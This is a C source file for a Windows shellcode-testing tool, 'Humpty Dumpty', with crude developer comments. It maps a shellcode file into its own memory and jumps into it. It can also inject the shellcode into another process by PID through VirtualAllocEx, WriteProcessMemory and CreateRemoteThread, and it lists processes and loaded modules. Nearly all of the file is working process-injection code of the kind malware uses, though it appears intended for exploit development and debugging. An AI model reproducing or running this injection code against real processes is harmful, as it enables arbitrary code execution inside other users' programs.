/*********************************************
Humpty Dumpty, the windows version.



TODO:
	-->  remote module loading.
    --> module unloading (local and remote)

*********************************************/
#include "sa7_win.h"

//TCHAR szName[] = TEXT("ShellcodeMappingObj");
typedef HMODULE (__stdcall *PLoadLibraryW)(wchar_t*);
typedef HMODULE (__stdcall *PGetModuleHandleW)(wchar_t*);
typedef BOOL    (__stdcall *PFreeLibrary)(HMODULE);
typedef FARPROC (__stdcall *PGetProcAddress)(HMODULE, char*);

//PROTOTYPES cuz cl is p00.
void map_and_run_file(const char *fname);
void load_dll(const char *fname);
void show_loaded();
void cleanup_target(); //I dont know whay you gotta prototype some shit and not
                        //others. but this worked. eh. maybe its for void()s
void list_processes();
void coward_out();
//-------------------------
/*
struct RemoteThreadBlock {
    DWORD               ErrorLoad; // error value for LoadLibrary
    DWORD               ErrorFunction; // error value for executed function
    DWORD               ReturnCodeForFunction;// error value for executed
                                              //funtion
    DWORD               ErrorFree;// error value for FreeLibrary

    HMODULE             hModule;
    BOOL                bLoadLibrary;
    BOOL                bFreeLibrary;

    PLoadLibraryW       fnLoadLibrary;
    PGetModuleHandleW   fnGetModuleHandle;
    PFreeLibrary        fnFreeLibrary;
    PGetProcAddress     fnGetProcAddress;

    wchar_t             lpModulePath[_MAX_PATH];    // the DLL path
    char                lpFunctionName[256];        // the called function
};
*/
//GLOBALS
HMODULE user_dlls[1024];
int user_dlls_count = 0;
int target_pid = 0;     //pid of target.
HANDLE target_h = NULL; //handle to the open target process ID (maybey not
                        //useful.
DWORD target_entry = NULL; //after injected this is the entry point of injection
//----------


int get_fsize(const char *fname){
//Get the size of our file on the disk so that we can allocate space for it in memory.
	struct stat fileStat;
	int err = stat(fname, &fileStat);
	//printf("\nStat()ing %s", fname);
	if (0 != err) return 0;
		printf("\n\t%s is %d bytes",fname,fileStat.st_size);
	return fileStat.st_size;
};

void print_cmds() {
    printf("\n\t---------------- COMMANDS FOR LOCAL EXECUTION ----------------------");
    printf("\n\tE[x]ecute shellcode. //you give it a file with your binary shellcode.");
	printf("\n\t\t\t\t//It maps it into its address space, then jumps into it.");
    printf("\n\t[l]oad a library. //Test your shellcode against the actual dlls with your importer.");
	printf("\n\t[u]nload a library/module. <-- broke");
    printf("\n\t[s]how all loaded libraries/modules.");
    printf("\n\t--------------------------------------------------------------------");
    printf("\n\n\t---------------- COMMANDS FOR INJECTED/REMOTE EXECUTION ------------");
    printf("\n\t[p]id of target to inject into.");
    printf("\n\t[I]nject shellcode. //you give it a file with your binary shellcode. it injects it into the remote process."); 
    printf("\n\t[C]oward out. //for when you've injected and are ready to go, but change your mind.");
    printf("\n\t[B]egin remote execution of your shellcode.");
    printf("\n\tPrint [t]argeting information that you've already set.");
    printf("\n\t--------------------------------------------------------------------");
    printf("\n\n\t---------------- GENERIC Commands------------");
    printf("\n\tList [a]ll processes.");
	printf("\n\t[q]uit HumptyDumpty.");
    printf("\n\t--------------------------------------------------------------------");
    printf("\n\n");
};

char *get_user_line(int *pLength, int bIgnoreSocket) { //ripped from MCF2 shellterm.c
							// only cuz I am too lame to write my own parsing shit myself.
        static char buffer[1000];
        char *p;

//TODO

        if(!fgets(buffer, sizeof(buffer), stdin))
                return NULL;
        if((p=strchr(buffer,'\r'))) *p=0;
        if((p=strchr(buffer,'\n'))) *p=0;

        if(pLength)
                *pLength = strlen(buffer);

        return buffer;
};

void print_prompt() { //wow! look I even ripped the print_prompt to achieve
					// new levels of depravity. I should be shot.
	printf("\nhumptydumpty> ");
};

void show_targeting_info(){
    if (target_pid == 0)
      printf("\n\tTarget not not set.");
    else
      printf("\n\tTarget PID: %d", target_pid);
    if (target_entry != NULL)
      printf("\n\tEntrypoint for execution: @0x%.8x", target_entry);
    else
      printf("\n\tThere is no Entrypoint yet, you must inject shellcode.");

    if (target_h != NULL)
      printf("\n\tWe *ARE* connected to target process and are ready to launch.");
    else
      printf("\n\tWe *ARE NOT* attached to target process.");
};

int user_interface() { //even the cBreaks was ripped from MCF2 shellterm.c. Why? cuz I am lame AND lazy!
	int cbreaks=0;
	char *line; int line_length; char cmd; char*p;
	char file_name[500];
	do {
		print_prompt();	
		line = get_user_line(&line_length, 1);
		if(line_length!=1 || line[1]!='\0') {
			print_cmds();
			continue;
		};
		cmd = *line;
		if (('x' == cmd) || ('X' == cmd)) {
			printf("\n\tYour shellcode is where? ==> ");
			if (!(p=get_user_line(NULL,1)))
				break;
			strncpy(file_name,p,sizeof(file_name));
			map_and_run_file(file_name);
				
		}
		else if (('l' == cmd) || ('L' == cmd)) {
            printf("\n\tWhat dll did you wanna load? ==> ");
            if (!(p=get_user_line(NULL,1)))
                break;
            strncpy(file_name,p,sizeof(file_name));
            load_dll(file_name);
		}
		else if (('u'== cmd) || ('U' == cmd)) {
            printf("\n\t\tNot implemented yet...");
		}
		else if (('s' == cmd) || ('S' == cmd)) {
			show_loaded();	
		}
		else if (('q' == cmd) || ('Q' == cmd)) {
			printf("\nLater...\n");
			exit(0);
		}
        else if (('p' == cmd) || ('P' == cmd)) {
            printf("\n\tWhat process do you want to target. ==> ");
            if (!(p=get_user_line(NULL,1)))
                break; 
            set_target_pid(atoi(p));
            //show_targeting_info();
        }
        else if (('i' == cmd) || ('I' == cmd)) {
            //inject shellcode.
            printf("\n\tYour shellcode is where? ==> ");
            if (!(p=get_user_line(NULL,1)))
                break;
            strncpy(file_name,p,sizeof(file_name));
            inject_file(file_name);
        }
        else if (('b' == cmd) || ('B' == cmd)) {
            //begin execution of injected shellcode.
            if ((target_pid == 0) && (target_h == NULL))
                printf("\nYou havent yet specified a target.\n\n");
            else
                jump_into_remote();
        }
        else if (('c' == cmd) || ('C' == cmd)) 
            coward_out();
        else if (('t' == cmd) || ('T' == cmd)) {
            //Print targeting information.
            show_targeting_info();
        }
        else if (('a' == cmd) || ('A' == cmd))
            list_processes();
		else {
			printf("wtf? uhm no. the commands are: \n");
			print_cmds();
			continue;
		}
	}while(0==cbreaks);
};


void map_and_run_file(const char *fname){
//Allocate space for, and copy our file into this space.
	int fsize;
	HANDLE hMapFile;
	LPCTSTR pBuf;
	HANDLE fstream = NULL;
	fsize = get_fsize(fname); //get the size of the file to be mapped.
/*
	if ((fstream = fopen(fname, "r")) == NULL) 
		printf("The file was not opened.\n"); 
*/
//	fstream = OpenFile(fname, NULL, OF_READWRITE);
	//We have to use CreateFile below because its the only function I could find that 
	//will "open" a file but return a bone fide HANDLE....I h8 winders.
	fstream = CreateFile(fname, FILE_ALL_ACCESS, NULL, NULL, OPEN_EXISTING, NULL, NULL); //there is a gayass warning on this, but fuckit. 
	hMapFile = CreateFileMapping(
					fstream,    // actual file a$$h@ 
					NULL,                    // default security 
					PAGE_READWRITE,          // read/write access
					0,                       // max. object size 
					fsize,                // buffer size plus 1 for our CC 
					NULL); //normally a TCHAR, not naming to have multiple instances.
	if ((hMapFile <= 0) || (hMapFile == INVALID_HANDLE_VALUE)){ 
		printf("\nhMapFile: (%d)\nCould not create file mapping object.\n", hMapFile);
		wtf_error();
		return;
	}
	

	//the following actually "puts the shit in the memory"
	pBuf = (LPTSTR) MapViewOfFile(hMapFile,   // handle to mapped object
								FILE_MAP_ALL_ACCESS, // read/write permission
								0,                   
								0,                   
								fsize);           

	if (pBuf == NULL){ 
		printf("Could not map view of file.\n"); 
		wtf_error();
		return;
	}
 
	//CopyMemory((PVOID)pBuf, szMsg, strlen(szMsg)); //sample copy
    printf("\n**************************");
	printf("\nFile is Mapped at 0x%x ATTACH YOUR DEBUGGER OR WHATEVER NOW!!!", pBuf);
	printf("\n\n***** A FEW NOTES *****");
	printf("\n\t[+] WINDBG command to break on access at beginning of your shit:");
	printf("\n\t\t\"ba e1 %.08X; g;\"", pBuf);
 	printf("\n\t[+] Once I jump into your shit, anything goes...");
    printf("\n**************************");
	printf("\n\nHIT A KEY TO JUMP!!!");
	getch();
	printf("\n*** Ok, here we go... ***");
	((void (*)())pBuf)(); //I still cant get over how this actually controls EIP. amazing. 
							//amazing. just amazing. this technology shit, just amazes me. I mean...wow.
	//cleanup, if we ever even get back here. which we prolly dont.
	UnmapViewOfFile(pBuf);
	CloseHandle(hMapFile);
	CloseHandle(fstream);
};

void line_parse(const char *line){
	char *token = strtok(line, SPACE);
	while(token != NULL){
		token = strtok(NULL, SPACE);
	}
};

void print_modules(DWORD processID) { //mostly ripped from: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/perfmon/base/enumerating_all_modules_for_a_process.asp
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i; int dll_index;
    // Print the process identifier.
    printf("\nI have the following modules loaded:\n", processID );
    // Get a list of all the modules in this process.
    hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
                  PROCESS_VM_READ,
                  FALSE, processID );
    if (NULL == hProcess)
    return;
    if( EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)){
        for ( i = 0; i < (cbNeeded / sizeof(HMODULE)); i++ ){
            char szModName[MAX_PATH];
            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName))) {
                // Print the module name and handle value.
								dll_index = check_user_loaded(hMods[i]);
                	printf("\t==> %s (0x%08X)\n", szModName, hMods[i], dll_index);
            }
        }
    }
		printf("\nYou have manually loaded %d dlls.\n", user_dlls_count);
    CloseHandle(hProcess);
};


void print_processes(DWORD processID) { //misnomer cuz we only print one
                                        //processID's worth of info
    HANDLE hProcess;
    char pname[512];    //pname = "<name unknown>";

  // Get a handle to the process.
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                  PROCESS_VM_READ,
                  FALSE, processID);

  // Get the process name. THIS IS SO STUPID. THE first in the Module list is
  // the name of the process!
    if (NULL != hProcess){
        HMODULE hMod;
        DWORD cbNeeded;
        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded)){
            GetModuleBaseName( hProcess, hMod, pname, sizeof(pname)/sizeof(char) );
        }
    }
    printf("\n\tPID: %d -- (%s)", processID, pname);

/* This attempt didnt work. fuckit.
    if (getProcessImageFileName(hProcess, pname, psize)){
        print ("\n--> %d  (%s)", processID, pname);
    } else {
        print ("\n--> %d  (unknown)", processID);
    };
*/
    CloseHandle(hProcess);
};

int set_target_pid(t_pid){
//Test if we can open the process. if we can then set the global target_pid
    if (target_h == NULL){
        target_pid = t_pid;
        printf("\n\tOk. Targeting %d", target_pid);
        return 0;
    } else {
        printf("\n\tCant change cuz we are currently attached to %d.", target_pid);
    }
};

void coward_out(){
    if (target_pid != 0) {
        printf("\n\t Ok. Cowarding out...");
        cleanup_target();
    } else {
        printf("\n\t You have nothing to punk out about yet.");
    };
};

int inject_file(const char *file_name){
    HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);
    if (hProcess != NULL ){
        //Do ExecuteRemoteThread()
        //printf("\n\nSUCCESS! It looks like you can open that process!\n");
        if (target_pid == 0) {
            printf("\n!!! You havent even selected your target, ass!");
            return 1;
        };
        target_h = hProcess;
        mapin_and_inject(file_name);
    } else {
        printf("\n\nFailed to open process id %d.", target_pid);
        //wtf_error();
        cleanup_target();
    }
    return 0;
};

int mapin_and_inject(const char *file_name) {
    int fsize;
    HANDLE hMapFile;
    LPCTSTR pBuf;
    DWORD rc;
    HANDLE fstream = NULL;
    void *remote_mem = 0;
    //RemoteThreadBlock *remote_teb = 0;
    HANDLE hThread = 0;
    HANDLE hProcess = target_h; //copy handle to open target process from global
                                //into local
    fsize = get_fsize(file_name); //get the size of the file to be mapped.

//-------------------------------------------------------------------------------
//Set up shit locally, we map the file into our local memory, cuz I dont know
//how to go directly from file into the remote process. fuckit th0.

    fstream = CreateFile(file_name, FILE_ALL_ACCESS, NULL, NULL, OPEN_EXISTING,
NULL, NULL); //there is a gayass warning on this, but fuckit.
    hMapFile = CreateFileMapping(
                    fstream,    // actual file a$$h@
                    NULL,                    // default security
                    PAGE_READWRITE,          // read/write access
                    0,                       // max. object size
                    fsize,                // buffer size plus 1 for our CC
                    NULL); //normally a TCHAR, not naming to have multiple instances.
    if ((hMapFile <= 0) || (hMapFile == INVALID_HANDLE_VALUE)){
        printf("\nhMapFile: (%d)\nCould not create file mapping object.\n", hMapFile);
        wtf_error();
        return;
    }

    //the following actually "puts the shit in the memory"
    pBuf = (LPTSTR) MapViewOfFile(hMapFile,   // handle to mapped object
                                FILE_MAP_ALL_ACCESS, // read/write permission
                                0,
                                0,
                                fsize);

    if (pBuf == NULL){
        printf("Could not map view of file.\n");
        wtf_error();
        return;
    }

// ------------------------------------------------------------------------
// OK here we actually alloc the space we need in the remote process. and try to
// write the shellcode we have mapped locally into that memory.

    remote_mem = VirtualAllocEx(hProcess, 0, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if ( remote_mem == 0 ){
         printf("\n\n\tERROR could not alloc space in PID: %d", target_pid);
    } else {
        printf("\n\tSuccessfully alloc'd block of %d bytes @0x%.8x in PID %d.", fsize, remote_mem, target_pid);
    };
    if (! WriteProcessMemory(hProcess, remote_mem, pBuf, fsize, 0)){
        printf("\n\n\tERROR could not write shellcode into PID: %d", target_pid);
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    } else {
        printf("\n\tI wrote %d bytes of your shellcode to 0x%.8x in PID %d!", fsize, remote_mem, target_pid);
        target_entry = remote_mem;
    };
};

int jump_into_remote(){
    HANDLE hProcess = target_h;
    HANDLE hThread;
    void *remote_mem = target_entry;
    DWORD rc;

    show_targeting_info();
    printf("\nATTACH YOUR DEBUGGER to PID: %d !!!", target_pid);
    printf("\n\n***** A FEW NOTES *****");
    printf("\n\t[+] WINDBG command to break on access at beginning of your code:");
    printf("\n\t\t\"ba e1 %.08X; g;\"", target_entry);
    printf("\n\t[+] Once I jump into your shit, anything goes...");
    printf("\n\nHIT A KEY TO JUMP!!!");
    getch();
    printf("\n*** Ok, here we go... ***");
    hThread = CreateRemoteThread(hProcess, 0, 0, (DWORD (__stdcall *)( void *))remote_mem, 0, 0, &rc);
    if ( hThread == NULL ){
        printf("CreateRemoteThread() failed!");
        goto cleanup;
    };
    rc = WaitForSingleObject(hThread, INFINITE);
    switch(rc){
    case WAIT_TIMEOUT:
        printf("\n\nWaitForSingleObject() timed out. INFINITE is over!\n");
        goto cleanup;
    case WAIT_FAILED:
        printf("\n\nWaitForSingleObject() failed\n");
        goto cleanup;
    case WAIT_OBJECT_0:
        printf("\n\nThread running...\n");
        break;
    default:
        printf("\n\nWaitForSingleObject() failed!\n");
        goto cleanup;
    }

    cleanup:
        CloseHandle(hThread);
        cleanup_target();
    // Let's clean
/*
    if (remote_teb != 0 )
        VirtualFreeEx( hProcess, remote_teb, 0, MEM_RELEASE );
*/

/*
    if (hKernel32 != NULL)
        FreeLibrary( hKernel32 );
*/
    //return result;
};

void cleanup_target(){
    HANDLE hProcess = target_h;     
    if (target_entry != 0){
        VirtualFreeEx( hProcess, target_entry, 0, MEM_RELEASE);
        printf("\n\tFree'd 0x%.8x in pid: %d.", target_entry, target_pid );
    } 
    printf("\nNo longer targeting pid: %d", target_pid);
    if (target_h  != NULL){
        if (CloseHandle(target_h))
            printf("\nNo longer targeting pid: %d", target_pid);
        else 
            printf("\nERROR: couldnt deattach from %d", target_pid);
    } else {
        //printf("\nNo need to close process handle.");
    };
    target_h = NULL;
    target_entry = NULL;
    target_pid = 0;
};

int check_user_loaded(const HMODULE *mod_to_check) {
	int n;
	for (n=0; n<=user_dlls_count; n++) {
		//printf("\n\tChecking module at: 0x%08X.\n", mod_to_check);
		//printf("0x%08X 0x%08X", mod_to_check, user_dlls[n]);
		if (user_dlls[n] == mod_to_check){
			printf("*** %d ***", n);
			return(n);	
		}
	};
	return(0);
};

void show_loaded(){ ////mostly ripped from: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/perfmon/base/enumerating_all_modules_for_a_process.asp
	DWORD pid;
	pid = GetCurrentProcessId();
	print_modules(pid);
};

void list_processes(){
    DWORD pid;
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)){
        printf("\n!!!Couldnt enumerate processes. somethin's broke.");
        return;
    };
    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);
    // Print the name of the process for each pid.a
    printf("\n---------------\n");
    printf("Process List");
    printf("\n---------------\n");
    for (i = 0; i < cProcesses; i++){
        print_processes(aProcesses[i]);
    };
};

void make_process( VOID )
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // Start the child process. 
    if( !CreateProcess( NULL, // No module name (use command line). 
        "MyChildProcess", // Command line. 
        NULL,             // Process handle not inheritable. 
        NULL,             // Thread handle not inheritable. 
        FALSE,            // Set handle inheritance to FALSE. 
        0,                // No creation flags. 
        NULL,             // Use parent's environment block. 
        NULL,             // Use parent's starting directory. 
        &si,              // Pointer to STARTUPINFO structure.
        &pi )             // Pointer to PROCESS_INFORMATION structure.
    ) 
    {
        printf( "CreateProcess failed." );
    }

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
};

void load_dll(const char *fname) {
	HINSTANCE hinstlib; 
	hinstlib = LoadLibrary(fname);
	if (hinstlib != NULL) {
		user_dlls_count++;
		user_dlls[user_dlls_count]=hinstlib;
		printf("\n%s Loaded ok. Your \"handle\" for that dll is: *** %d ***\n", fname, user_dlls_count);
	}
	else 
		printf("\nShit *aint* kosher with the loading of \"%s\".\n", fname);
};
/*
void unload_dll(const int *user_handle){
	HINSTANCE maybe_mod;
	maybe_mod = user_dlls[user_handle];
	if (FreeLibrary(maybe_mod)){
		printf("\nShit *is* kosher with unloading that module...");
	} else
		printf("\nShit *aint* kosher with unloading that module...");
};
*/
void main(){
	//map_and_run_file("example.bin"); //binary file called example.bin
	//Getcmdlineargs();
	//load_dll("mshtml.dll");
	//show_loaded();
	//make_process();
    target_pid = 0;     //pid of target.
    target_h = NULL; //handle to the open target process ID (maybey not
                        //useful.
    target_entry = NULL; //after injected this is the entry point of injection

	printf("\n***\nShellcode...egg...Humpty Dumpty...eh.\n***\n\n");
	user_interface();
};
